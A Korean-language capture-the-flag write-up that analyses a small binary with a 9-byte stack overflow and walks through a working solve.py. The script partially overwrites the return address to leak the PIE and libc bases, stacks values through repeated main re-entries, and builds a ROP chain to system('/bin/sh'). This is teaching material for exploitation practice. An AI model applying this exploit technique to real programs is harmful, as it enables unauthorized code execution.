# 문제 개요

### 실행환경

Ubuntu 24.04  
상세 내용은 Dockerfile 참고

### 보호기법

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

### Disassemble

##### vuln

```nasm
   0x0000000000001169 <+0>:     endbr64
   0x000000000000116d <+4>:     push   rbp
   0x000000000000116e <+5>:     mov    rbp,rsp
   0x0000000000001171 <+8>:     sub    rsp,0x10
   0x0000000000001175 <+12>:    lea    rax,[rbp-0x10]
   0x0000000000001179 <+16>:    mov    edx,0x19
   0x000000000000117e <+21>:    mov    rsi,rax
   0x0000000000001181 <+24>:    mov    edi,0x0
   0x0000000000001186 <+29>:    call   0x1070 <read@plt>
   0x000000000000118b <+34>:    lea    rax,[rbp-0x10]
   0x000000000000118f <+38>:    mov    rdi,rax
   0x0000000000001192 <+41>:    call   0x1060 <puts@plt>
   0x0000000000001197 <+46>:    nop
   0x0000000000001198 <+47>:    leave
   0x0000000000001199 <+48>:    ret
```

##### main

```nasm
   0x000000000000119a <+0>:     endbr64
   0x000000000000119e <+4>:     push   rbp
   0x000000000000119f <+5>:     mov    rbp,rsp
   0x00000000000011a2 <+8>:     mov    eax,0x0
   0x00000000000011a7 <+13>:    call   0x1169 <vuln>
   0x00000000000011ac <+18>:    mov    eax,0x0
   0x00000000000011b1 <+23>:    pop    rbp
   0x00000000000011b2 <+24>:    ret
```

### Handray

```c
void vuln()
{
    char buf[0x10];
    read(0, buf, 0x19);
    puts(buf);
}

int main()
{
    vuln();
}
```

# 취약점 발생포인트

### BOF

`vuln` 함수에서 `9`바이트 만큼의 오버플로우가 발생합니다.  
이로 인해 `vuln` 함수의 `sfp` 값 전체와 `ret` 값의 마지막 1바이트가 변조될 수 있습니다.

### Memory Leak

`read` 함수가 `buf` 에 입력을 받은 후, `puts` 함수가 `buf` 를 출력합니다. `read` 함수는 입력의 끝에 `\0` 처리를 하지 않기 때문에 `puts` 함수에서 출력 시 Memory Leak이 발생할 수 있습니다.

-------------------------------------------------------------

# solve.py

## 사전 설명

##### IO

```python
# default io
def IO(send):
   r.send(send)
   return r.recvline()
```

`vuln` 함수 내부의 `read` 에 입력을 넣고 `puts` 의 출력을 받아 return 합니다.
문제에서 입출력이 해당 부분밖에 없기에, 편의를 위해 만들었습니다.

##### ret의 마지막 1바이트만 덮어 실행 흐름 조절

`PIE` 보호기법은 `0x1000` 단위의 랜덤값인 `Image Base` 위에 바이너리를 올리는 방식으로 주소값을 랜덤화 합니다. 때문에 주소의 세번짜 자릿수 까지는 `PIE` 의 영향을 받지 않습니다. 따라서 `Image Base` 를 알 수 없는 상태에서도 `ret` 의 마지막 1바이트를 조작해 실행 흐름을 바꿀 수 있습니다.

##### 스택에 임의의 값 push 하기

```python
IO(b"a"*16 + p64(value) + b"\x9e")
```

`vuln` 함수의 `read` 에서 입력을 받을 때, `sfp` 를 `value` 로 채우고 `ret` 의 마지막 바이트를 `0x9e` 로 설정합니다.  

```nasm
in <main>:
   0x000000000000119e <+4>:     push   rbp
```

`vuln` 함수의 에필로그에서 `leave` 명령어를 통해 `rbp` 레지스터에 `value` 가 들어가고, `ret` 명령어를 실행해 `<main+4>` 로 점프합니다.  
`push rbp` 명령어를 통해 스택에 `value` 가 push 되고, `main` 함수의 시작점으로 실행 흐름이 복귀됩니다.

## payload 설명

### leak codebase

```python
res = IO(b"a"*24 + b"\x9f") #skip push rbp
```

`vuln` 함수의 `ret` 값을 덮어 실행흐름을 `<main+5>` 부분으로 복귀합니다.  
입력 시 채우는 값에 `\0`이 없도록 하여 입력 이후 `puts` 함수에서 `vuln` 함수의 `ret` 값이 출력될 수 있도록 합니다.

```python
codebase = u64(res[24:-1] + b"\0\0") - 0x119f
```

출력된 `ret` 값으로 `codebase` 를 구합니다.

```python
start = codebase + 0x1080
main = codebase + 0x119e
ret = codebase + 0x1199
```

이후 사용할 코드들의 주소를 구합니다.  

### leak libcbase

```python
IO(b"a"*16 + p64(start) + b"\x9e")
```

스택에 `_start` 함수의 주소를 push 합니다.

```python
for i in range(29):
   IO(b"a"*16 + p64(ret) + b"\x9e")
IO(p64(main)*3 + b"\x99")
```

스택에 넣어둔 `_start` 함수가 실행된 이후 `__libc_start_call_main` 함수 기준 `rbp-0x90` 이 될 주소에 `main` 함수의 주소를 세팅합니다.  
스택에 `ret` 명령어의 주소를 쌓으며 내려간 뒤, `main` 함수의 주소를 입력하면서 `ret` 명령어로 점프하면 스택에 쌓아둔 `ret` 명령어를 타고 올라가 `_start` 함수가 실행됩니다.

>`__libc_start_call_main` 함수의 스택 프레임의 크기는 `0x90`이지만, `rbp-0x90` 은 사용되지 않습니다. 초기화 또한 되지 않습니다.  

`_start` 함수가 실행되고 `__libc_start_main` 함수와 `main` 함수를 거쳐 `vuln` 함수의 프롤로그가 끝나고 나면 스택은 아래와 같은 상황이 됩니다.

```nasm
...
buf | 0x7fffd87dceb0 --> 0x1 
buf | 0x7fffd87dceb8 --> 0x0 
sfp | 0x7fffd87dcec0 --> 0x7fffd87dced0
ret | 0x7fffd87dcec8 --> 0x633e5b3281ac <main+18>
sfp | 0x7fffd87dced0 --> 0x7fffd87dcf70
ret | 0x7fffd87dced8 --> 0x7215ed82a1ca <__libc_start_call_main+122>
    | 0x7fffd87dcee0 --> 0x633e5b32819e <main+4>
...
```

```python
IO(b"a"*24 + b"\x6e") #vuln+5
```

`ret` 값을 조작해 `vuln+5` 로 점프합니다. 이렇게 하면 `vuln` 함수의 `ret` 값이 `<__libc_start_call_main+122>` 가 됩니다.

```python
res = IO(b"a"*24 + b"\x06") #ret
```

`ret` 값을 조작해 `__libc_start_call_main` 함수 근처의 `ret` 명령어를 실행하면 스택에 미리 세팅해두었던 `main` 함수로 점프합니다.

>`<__libc_start_call_main+122>` 의 오프셋인 `0x2a1ca` 근처에서 `ret` 가젯을 탐색합니다.

```python
libcbase = u64(res[24:-1] + b"\0\0") - 0x2a106
```

`main` 함수로 점프하기 전 출력되는 `__libc_start_call_main` 함수 근처의 주소를 받아 `libcbase` 값을 구합니다.

```python
system = libcbase + 0x58750
poprdi = libcbase + 0x10f75b
binsh = libcbase + 0x1cb42f
```

ROP에 사용할 주소들을 구합니다.

```python
IO(b"a"*16 + p64(0) + b"\x9e") #stack alignment
IO(b"a"*16 + p64(system) + b"\x9e")
IO(b"a"*16 + p64(binsh) + b"\x9e")
IO(b"a"*16 + p64(poprdi) + b"\x9e")
IO(b"a"*16 + p64(0) + b"\x99")
```

스택에 값들을 하나씩 넣으며 ROP를 세팅합니다.  
마지막에 `ret` 명령어를 실행해 ROP를 트리거합니다.  
이후 `system("/bin/sh")` 가 실행되며 쉘 권한을 획득합니다.  

## 최종 payload

solve.py 파일 참고